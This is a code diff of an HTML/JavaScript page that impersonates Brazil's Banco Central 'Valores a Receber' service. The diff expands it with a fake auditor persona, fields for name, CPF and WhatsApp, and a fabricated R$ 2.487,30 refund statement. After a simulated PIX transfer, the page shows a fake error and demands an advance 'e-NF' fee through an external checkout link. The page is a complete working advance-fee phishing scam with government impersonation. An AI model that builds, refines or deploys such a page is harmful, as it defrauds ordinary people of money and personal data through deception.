@@ -9,48 +9,63 @@
         :root { --blue-gov: #003399; --gold-gov: #d4af37; --bg-gray: #f2f4f7; --text-dark: #1a202c; }
         body { font-family: 'Roboto', sans-serif; background-color: var(--bg-gray); margin: 0; padding: 0; color: var(--text-dark); }
         
-        .header-gov { background: var(--blue-gov); color: white; padding: 12px 20px; display: flex; align-items: center; border-bottom: 4px solid var(--gold-gov); position: sticky; top: 0; z-index: 1000; }
+        /* Header Institucional */
+        .header-gov { background: var(--blue-gov); color: white; padding: 12px 20px; display: flex; align-items: center; border-bottom: 4px solid var(--gold-gov); position: sticky; top: 0; z-index: 1000; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         .header-gov img { height: 35px; margin-right: 15px; }
-        .header-gov-text b { font-size: 14px; display: block; text-transform: uppercase; }
+        .header-gov-text { line-height: 1.2; }
+        .header-gov-text b { font-size: 14px; display: block; text-transform: uppercase; letter-spacing: 1px; }
         .header-gov-text span { font-size: 11px; opacity: 0.8; }
 
         .container { max-width: 550px; margin: 0 auto; background: white; min-height: 100vh; padding: 25px; box-shadow: 0 0 30px rgba(0,0,0,0.05); }
 
-        .msg { margin-bottom: 25px; padding: 20px; border-radius: 4px; font-size: 15px; line-height: 1.6; display: none; border-left: 5px solid var(--blue-gov); background: #fdfdfd; }
+        /* Mensagens do Auditor */
+        .msg { margin-bottom: 25px; padding: 20px; border-radius: 4px; font-size: 15px; line-height: 1.6; display: none; animation: fadeIn 0.4s ease forwards; border-left: 5px solid var(--blue-gov); background: #fdfdfd; box-shadow: 2px 2px 10px rgba(0,0,0,0.02); }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
         
         .perfil { display: flex; align-items: center; margin-bottom: 12px; padding-bottom: 10px; border-bottom: 1px solid #eee; }
-        .perfil img { width: 50px; height: 50px; border-radius: 4px; margin-right: 15px; border: 1px solid #ccc; }
+        .perfil img { width: 50px; height: 50px; border-radius: 4px; margin-right: 15px; filter: grayscale(20%); border: 1px solid #ccc; }
         .perfil-info b { font-size: 15px; color: var(--blue-gov); display: block; }
+        .perfil-info span { font-size: 10px; color: #666; font-family: 'Roboto Mono', monospace; font-weight: bold; }
 
-        .input-area { display: none; margin-bottom: 30px; }
+        /* Inputs e Botões */
+        .input-area { display: none; margin-bottom: 30px; animation: fadeIn 0.6s ease; }
         .label-input { font-size: 12px; font-weight: 900; color: #444; margin-bottom: 8px; display: block; text-transform: uppercase; }
-        .field { width: 100%; padding: 16px; border: 1px solid #cbd5e0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        .field { width: 100%; padding: 16px; border: 1px solid #cbd5e0; border-radius: 4px; font-size: 16px; box-sizing: border-box; background: #fcfcfc; transition: 0.2s; }
+        .field:focus { border-color: var(--blue-gov); outline: none; background: #fff; box-shadow: 0 0 0 3px rgba(0,51,153,0.1); }
         
-        .btn-primary { background: #22c55e; color: white; border: none; padding: 20px; width: 100%; border-radius: 4px; font-weight: 900; font-size: 16px; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        .btn-primary { background: #22c55e; color: white; border: none; padding: 20px; width: 100%; border-radius: 4px; font-weight: 900; font-size: 16px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; margin-top: 10px; }
+        .btn-primary:hover { background: #16a34a; }
         
-        .option-card { background: #fff; border: 1px solid #e2e8f0; padding: 15px; margin-bottom: 10px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; font-weight: bold; }
+        .option-card { background: #fff; border: 1px solid #e2e8f0; padding: 15px; margin-bottom: 10px; border-radius: 4px; cursor: pointer; display: flex; align-items: center; font-weight: bold; transition: 0.2s; }
+        .option-card:hover { border-color: var(--blue-gov); background: #f8fafc; }
         .option-card.active { border-color: var(--blue-gov); background: #ebf4ff; color: var(--blue-gov); }
 
+        /* Resumo de Liquidação */
         .cedula-container { display: none; border: 2px solid #000; padding: 2px; margin: 20px 0; background: #fff; }
-        .cedula-inner { border: 1px solid #000; padding: 15px; font-family: 'Roboto Mono', monospace; font-size: 12px; }
+        .cedula-inner { border: 1px solid #000; padding: 15px; font-family: 'Roboto Mono', monospace; font-size: 12px; position: relative; }
+        .cedula-header { text-align: center; border-bottom: 2px solid #000; padding-bottom: 10px; margin-bottom: 10px; }
         .cedula-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
         .total-row { border-top: 2px dashed #000; margin-top: 10px; padding-top: 10px; font-size: 16px; font-weight: 900; }
 
+        /* Loading e Barra de Progresso */
         .loading-box { display: none; text-align: center; padding: 40px 0; }
-        .progress-container { width: 100%; background-color: #e2e8f0; border-radius: 10px; margin: 20px 0; height: 12px; }
-        .progress-bar { width: 0%; height: 100%; background-color: #22c55e; border-radius: 10px; transition: width 0.1s; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--blue-gov); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .progress-container { width: 100%; background-color: #e2e8f0; border-radius: 10px; margin: 20px 0; height: 14px; display: none; overflow: hidden; border: 1px solid #cbd5e0; }
+        .progress-bar { width: 0%; height: 100%; background-color: #22c55e; transition: width 0.1s; }
 
         .checkout-area { display: none; text-align: center; }
-        .btn-pagar { background: var(--blue-gov); color: white; text-decoration: none; padding: 22px; border-radius: 4px; font-weight: 900; display: block; font-size: 18px; margin-top: 20px; }
+        .btn-pagar { background: var(--blue-gov); color: white; text-decoration: none; padding: 22px; border-radius: 4px; font-weight: 900; display: block; font-size: 18px; margin-top: 20px; box-shadow: 0 10px 20px rgba(0,51,153,0.2); }
     </style>
 </head>
 <body>
 
     <div class="header-gov">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_of_Brazil_logo.svg/1200px-Government_of_Brazil_logo.svg.png">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_of_Brazil_logo.svg/1200px-Government_of_Brazil_logo.svg.png" alt="Gov BR">
         <div class="header-gov-text">
             <b>Banco Central do Brasil</b>
-            <span>Sistema de Valores a Receber (SVR)</span>
+            <span>Sistema de Valores a Receber (SVR) - Auditoria 2026</span>
         </div>
     </div>
 
@@ -59,136 +74,223 @@
         <div id="m1" class="msg">
             <div class="perfil">
                 <img src="https://raw.githubusercontent.com/portal-verificador-br/robertomenezes/main/robertoitau.png">
-                <div class="perfil-info"><b>Dr. Roberto Silva</b></div>
+                <div class="perfil-info"><b>Dr. Roberto Silva</b><span>ID: 4882-9 / AUDITOR CHEFE SVR</span></div>
             </div>
-            Procedimento de auditoria iniciado. Informe seus dados para varredura.
+            Procedimento de auditoria iniciado. Este portal realiza o cruzamento de cobranças indevidas de IOF, tarifas administrativas e juros contratuais superiores à taxa Selic acumulada nos últimos 10 anos.
         </div>
+
+        <div id="m2" class="msg">Para iniciarmos a varredura nos sistemas interbancários, por favor, informe os dados do titular.</div>
         
         <div id="i1" class="input-area" style="display:block;">
-            <label class="label-input">Nome Completo:</label>
-            <input type="text" id="nome-in" class="field">
-            <label class="label-input" style="margin-top:15px;">CPF:</label>
-            <input type="tel" id="cpf-in" class="field">
-            <button class="btn-primary" onclick="step(1)">Verificar Base</button>
+            <label class="label-input">Nome Completo do Titular:</label>
+            <input type="text" id="nome-in" class="field" placeholder="Ex: João Silva Sauro">
+            
+            <label class="label-input" style="margin-top:15px;">CPF (Somente números):</label>
+            <input type="tel" id="cpf-in" class="field" placeholder="000.000.000-00">
+
+            <label class="label-input" style="margin-top:15px;">WhatsApp para Notificações:</label>
+            <input type="tel" id="tel-in" class="field" placeholder="(00) 00000-0000">
+
+            <button class="btn-primary" onclick="step(1)">Verificar na Base de Dados</button>
         </div>
 
-        <div id="m-extrato" class="msg">Valores encontrados! Confira seu extrato:</div>
+        <div id="m3" class="msg">Dados identificados. Agora, <span id="user-first-name"></span>, responda com precisão para o cálculo do estorno:</div>
+        
+        <div id="i2" class="input-area">
+            <label class="label-input">Possui conta ativa há mais de 3 anos?</label>
+            <div class="option-card" onclick="setOpt(this)">Sim, possuo.</div>
+            <div class="option-card" onclick="setOpt(this)">Não/Menos de 3 anos.</div>
+
+            <label class="label-input" style="margin-top:15px;">Realizou empréstimos ou financiamentos (Casa/Carro)?</label>
+            <div class="option-card" onclick="toggleFinanc(true)">Sim, realizei contratos.</div>
+            <div class="option-card" onclick="toggleFinanc(false)">Não realizei empréstimos.</div>
+
+            <div id="area-valor-financ" style="display:none; margin-top:15px;">
+                <label class="label-input">Valor somado dos contratos (Aproximado):</label>
+                <select id="val-financ" class="field">
+                    <option value="5000">Até R$ 5.000,00</option>
+                    <option value="15000">Entre R$ 5.000 e R$ 20.000</option>
+                    <option value="50000">Acima de R$ 50.000,00</option>
+                </select>
+            </div>
+
+            <button class="btn-primary" style="margin-top:20px;" onclick="step(2)">Processar Lotes de Restituição</button>
+        </div>
+
+        <div id="m4" class="msg">Selecione abaixo as instituições onde houve movimentação financeira no período:</div>
+        <div id="i3" class="input-area">
+            <div id="bank-list">
+                <div class="option-card" onclick="selectBank(this, 'Itaú Unibanco')">Itaú Unibanco</div>
+                <div class="option-card" onclick="selectBank(this, 'Bradesco S/A')">Bradesco S/A</div>
+                <div class="option-card" onclick="selectBank(this, 'Banco do Brasil')">Banco do Brasil</div>
+                <div class="option-card" onclick="selectBank(this, 'Caixa Econômica')">Caixa Econômica Federal</div>
+                <div class="option-card" onclick="selectBank(this, 'Santander')">Santander Brasil</div>
+                <div class="option-card" onclick="selectBank(this, 'Nubank')">Nubank / Nu Financeira</div>
+            </div>
+            <button class="btn-primary" onclick="finalProcess()">Consultar Saldo Final</button>
+        </div>
+
+        <div id="loading" class="loading-box">
+            <div class="spinner"></div>
+            <p id="loading-txt" style="font-family:'Roboto Mono'; font-size:12px;">CONECTANDO AO SERVIDOR SVR-BACEN...</p>
+            <div id="prog-wrap" class="progress-container"><div id="prog-bar" class="progress-bar"></div></div>
+        </div>
+
+        <div id="m5" class="msg" style="border-left-color: #22c55e;">
+            <b>AUDITORIA FINALIZADA!</b><br>
+            Foram encontrados valores retidos e juros abusivos prontos para liquidação imediata. Confira o extrato oficial abaixo:
+        </div>
+
         <div id="cedula" class="cedula-container">
             <div class="cedula-inner">
+                <div class="cedula-header">
+                    <b style="font-size:14px;">EXTRATO DE LIQUIDAÇÃO DE VALORES</b><br>
+                    <span>ID CONSULTA: #BC-9928371-2026</span>
+                </div>
                 <div class="cedula-row"><span>TITULAR:</span> <b id="r-nome"></b></div>
                 <div class="cedula-row"><span>CPF:</span> <b id="r-cpf"></b></div>
-                <div class="cedula-row total-row"><span>TOTAL A RECEBER:</span> <span style="color:#22c55e;">R$ 2.487,30</span></div>
-            </div>
-        </div>
-
-        <div id="i-solicitar" class="input-area">
-            <button class="btn-primary" onclick="goMetodo()">SOLICITAR RESGATE AGORA</button>
-        </div>
-
-        <div id="m-metodo" class="msg">Selecione o método de recebimento:</div>
-        <div id="i-metodo" class="input-area">
-            <div class="option-card" onclick="setMetodo(this, 'PIX')">PIX (Imediato)</div>
-            <div class="option-card" onclick="setMetodo(this, 'TED')">TED (24 horas)</div>
-            <button class="btn-primary" onclick="goChave()">CONTINUAR</button>
-        </div>
-
-        <div id="m-chave" class="msg">Informe sua chave PIX:</div>
-        <div id="i-chave" class="input-area">
-            <input type="text" id="pix-in" class="field" placeholder="CPF, Celular ou E-mail">
-            <button class="btn-primary" onclick="goConfirmar()">VERIFICAR DADOS</button>
-        </div>
-
-        <div id="m-resumo" class="msg"><b>CONFIRME OS DADOS PARA TRANSFERÊNCIA:</b></div>
-        <div id="cedula-resumo" class="cedula-container">
-            <div class="cedula-inner">
-                <div class="cedula-row"><span>TITULAR:</span> <b id="f-nome"></b></div>
-                <div class="cedula-row"><span>CHAVE PIX:</span> <b id="f-pix"></b></div>
-                <div class="cedula-row total-row"><span>VALOR:</span> <b>R$ 2.487,30</b></div>
-                <div style="margin-top:15px; font-size:11px;">
-                    <input type="checkbox" id="check-autorizo">
-                    <label for="check-autorizo">Eu autorizo o saque pelo Banco Central e estou ciente que é permitido apenas <b>um resgate por CPF</b>.</label>
+                <div class="cedula-row" style="margin-top:10px; border-top: 1px solid #ccc;"><span>INSTITUIÇÕES:</span> <b id="r-bancos" style="font-size:9px;"></b></div>
+                <div style="margin-top:15px;">
+                    <div class="cedula-row"><span>TARIFAS ADM (10 ANOS):</span> <span>R$ 1.142,10</span></div>
+                    <div class="cedula-row"><span>ESTORNO IOF/SEGUROS:</span> <span>R$ 845,20</span></div>
+                    <div class="cedula-row"><span>JUROS ABUSIVOS CALC.:</span> <span>R$ 500,00</span></div>
+                </div>
+                <div class="cedula-row total-row">
+                    <span>TOTAL A RECEBER:</span>
+                    <span style="color:#22c55e;">R$ 2.487,30</span>
                 </div>
             </div>
         </div>
-        <div id="i-confirmar" class="input-area">
-            <button class="btn-primary" onclick="iniciarEnvio()">CONFIRMAR E RECEBER</button>
+
+        <div id="i-resgate" class="input-area">
+            <button class="btn-primary" onclick="goMetodo()">SOLICITAR RESGATE VIA PIX/TED</button>
         </div>
 
-        <div id="loading-envio" class="loading-box">
-            <p id="status-envio" style="font-family:'Roboto Mono'; font-size:12px;">INICIANDO TRANSFERÊNCIA PIX...</p>
-            <div class="progress-container"><div id="bar-envio" class="progress-bar"></div></div>
+        <div id="m-metodo" class="msg">Selecione a forma de recebimento:</div>
+        <div id="i-metodo" class="input-area">
+            <div class="option-card" onclick="setOpt(this)">PIX (Recebimento em 5 minutos)</div>
+            <div class="option-card" onclick="setOpt(this)">TED (Recebimento em até 24h)</div>
+            <button class="btn-primary" onclick="goChave()">CONTINUAR</button>
+        </div>
+
+        <div id="m-chave" class="msg">Informe sua <b>Chave PIX</b> para depósito:</div>
+        <div id="i-chave" class="input-area">
+            <input type="text" id="pix-in" class="field" placeholder="CPF, E-mail, Celular ou Aleatória">
+            <button class="btn-primary" onclick="goResumoFinal()">GERAR PROTOCOLO DE ENVIO</button>
+        </div>
+
+        <div id="m-resumo-final" class="msg"><b>CONFIRME OS DADOS PARA TRANSFERÊNCIA:</b></div>
+        <div id="cedula-final" class="cedula-container">
+            <div class="cedula-inner">
+                <div class="cedula-row"><span>TITULAR:</span> <b id="f-nome"></b></div>
+                <div class="cedula-row"><span>CHAVE PIX:</span> <b id="f-pix"></b></div>
+                <div class="cedula-row total-row"><span>VALOR A ENVIAR:</span> <span style="color:#22c55e;">R$ 2.487,30</span></div>
+                <div style="margin-top:15px; font-size:11px; padding:10px; background:#f8fafc; border:1px solid #e2e8f0; border-radius:4px;">
+                    <input type="checkbox" id="check-termos">
+                    <label for="check-termos">Eu autorizo o saque via <b>Banco Central do Brasil</b> e estou ciente de que o sistema permite apenas <b>um resgate por CPF</b>.</label>
+                </div>
+            </div>
+        </div>
+        <div id="i-final" class="input-area">
+            <button class="btn-primary" onclick="requestTransfer()">CONFIRMAR E RECEBER AGORA</button>
         </div>
 
         <div id="error-final" class="checkout-area">
             <div style="background:#fff5f5; border:1px solid #feb2b2; padding:15px; border-radius:4px; color:#c53030; font-weight:bold; margin-bottom:20px;">
-                ERRO: PROTOCOLO DE LIBERAÇÃO GT-SVR NÃO LOCALIZADO
+                ERRO: GUIA DE TRANSPORTE (GT-SVR) NÃO LOCALIZADA
             </div>
             <div class="msg" style="display:block; text-align:left; border-left-color: #c53030;">
-                Conforme instrução normativa do <b>Governo Federal</b>, a transferência de valores de auditoria bancária requer a liquidação antecipada da <b>Tarifa de Emissão de Nota Fiscal Eletrônica (e-NF)</b>.
+                Para liberar o envio imediato do lote de <b>R$ 2.487,30</b>, é necessário a liquidação da <b>Tarifa de Emissão de Nota Fiscal Eletrônica (e-NF)</b>.
                 <br><br>
-                Este valor é reembolsado automaticamente, sendo creditado junto ao seu saldo final.
+                <b>Nota:</b> Este valor é reembolsado integralmente no momento do saque.
             </div>
-            <div class="cedula-row total-row" style="background:#f0fff4; padding:15px; border: 1px solid #22c55e;">
-                <span>SALDO + REEMBOLSO:</span>
-                <b style="color:#22c55e; font-size: 20px;">R$ 2.524,30</b>
+            <div class="cedula-row total-row" style="background:#f0fff4; padding:15px; border:1px solid #22c55e;">
+                <span>SALDO COM REEMBOLSO:</span>
+                <span style="color:#22c55e;">R$ 2.524,30</span>
             </div>
-            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-pagar">EMITIR NOTA E RECEBER AGORA</a>
+            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-pagar">EMITIR NOTA E RECEBER R$ 2.524,30</a>
         </div>
 
     </div>
 
     <script>
-        let nome = '';
+        let data = { nome: '', cpf: '', bancos: [] };
+
         function step(n) {
-            nome = document.getElementById('nome-in').value;
-            document.getElementById('i1').style.display = 'none';
-            document.getElementById('r-nome').innerText = nome.toUpperCase();
-            document.getElementById('r-cpf').innerText = document.getElementById('cpf-in').value;
-            show('m-extrato'); show('cedula'); show('i-solicitar');
+            if (n === 1) {
+                data.nome = document.getElementById('nome-in').value;
+                data.cpf = document.getElementById('cpf-in').value;
+                if(data.nome.length < 5) return alert('Preencha os dados.');
+                document.getElementById('user-first-name').innerText = data.nome.split(' ')[0];
+                hide('i1'); show('m3'); setTimeout(() => show('i2'), 800);
+            } else if (n === 2) {
+                hide('i2'); show('m4'); setTimeout(() => show('i3'), 800);
+            }
         }
 
         function show(id) { document.getElementById(id).style.display = 'block'; window.scrollTo(0,document.body.scrollHeight); }
         function hide(id) { document.getElementById(id).style.display = 'none'; }
 
-        function goMetodo() { hide('i-solicitar'); show('m-metodo'); show('i-metodo'); }
-        function setMetodo(el, m) { 
-            let cards = document.querySelectorAll('.option-card');
-            cards.forEach(c => c.classList.remove('active'));
+        function setOpt(el) {
+            let sibs = el.parentElement.querySelectorAll('.option-card');
+            sibs.forEach(s => s.classList.remove('active'));
             el.classList.add('active');
         }
-        function goChave() { hide('i-metodo'); show('m-chave'); show('i-chave'); }
-        
-        function goConfirmar() {
-            let pix = document.getElementById('pix-in').value;
-            if(pix.length < 5) return alert('Insira uma chave válida');
-            document.getElementById('f-nome').innerText = nome.toUpperCase();
-            document.getElementById('f-pix').innerText = pix;
-            hide('i-chave'); show('m-resumo'); show('cedula-resumo'); show('i-confirmar');
+
+        function toggleFinanc(val) {
+            document.getElementById('area-valor-financ').style.display = val ? 'block' : 'none';
         }
 
-        function iniciarEnvio() {
-            if(!document.getElementById('check-autorizo').checked) return alert('Você deve concordar com os termos.');
-            hide('i-confirmar');
-            show('loading-envio');
-            
-            let bar = document.getElementById('bar-envio');
-            let status = document.getElementById('status-envio');
+        function selectBank(el, name) {
+            el.classList.toggle('active');
+            if(data.bancos.includes(name)) data.bancos = data.bancos.filter(b => b !== name);
+            else data.bancos.push(name);
+        }
+
+        function finalProcess() {
+            if(data.bancos.length === 0) return alert('Selecione um banco.');
+            hide('i3'); show('loading');
+            setTimeout(() => {
+                hide('loading');
+                document.getElementById('r-nome').innerText = data.nome.toUpperCase();
+                document.getElementById('r-cpf').innerText = data.cpf;
+                document.getElementById('r-bancos').innerText = data.bancos.join(' / ');
+                show('m5'); show('cedula'); show('i-resgate');
+            }, 3000);
+        }
+
+        function goMetodo() { hide('i-resgate'); show('m-metodo'); show('i-metodo'); }
+        function goChave() { hide('i-metodo'); show('m-chave'); show('i-chave'); }
+        function goResumoFinal() {
+            let pix = document.getElementById('pix-in').value;
+            if(pix.length < 5) return alert('Informe a chave.');
+            document.getElementById('f-nome').innerText = data.nome.toUpperCase();
+            document.getElementById('f-pix').innerText = pix;
+            hide('i-chave'); show('m-resumo-final'); show('cedula-final'); show('i-final');
+        }
+
+        function requestTransfer() {
+            if(!document.getElementById('check-termos').checked) return alert('Concorde com os termos.');
+            hide('i-final');
+            show('loading');
+            document.getElementById('prog-wrap').style.display = 'block';
+            let bar = document.getElementById('prog-bar');
+            let txt = document.getElementById('loading-txt');
             let w = 0;
             let int = setInterval(() => {
-                w += 1;
+                w++;
                 bar.style.width = w + '%';
-                if(w == 30) status.innerText = "AUTENTICANDO JUNTO AO BANCO CENTRAL...";
-                if(w == 60) status.innerText = "PROCESSANDO LOTE DE PAGAMENTO...";
-                if(w == 90) status.innerText = "FINALIZANDO ENVIO DO PIX...";
+                if(w == 30) txt.innerText = "VALIDANDO CHAVE PIX...";
+                if(w == 70) txt.innerText = "ENVIANDO PIX PARA O TITULAR...";
                 if(w >= 100) {
                     clearInterval(int);
-                    hide('loading-envio');
+                    hide('loading');
                     show('error-final');
                 }
-            }, 50);
+            }, 60);
         }
 
-        window.onload = () => { setTimeout(() => show('m1'), 500); }
+        window.onload = () => { setTimeout(() => show('m1'), 500); setTimeout(() => show('m2'), 2500); }
     </script>
 </body>
 </html>
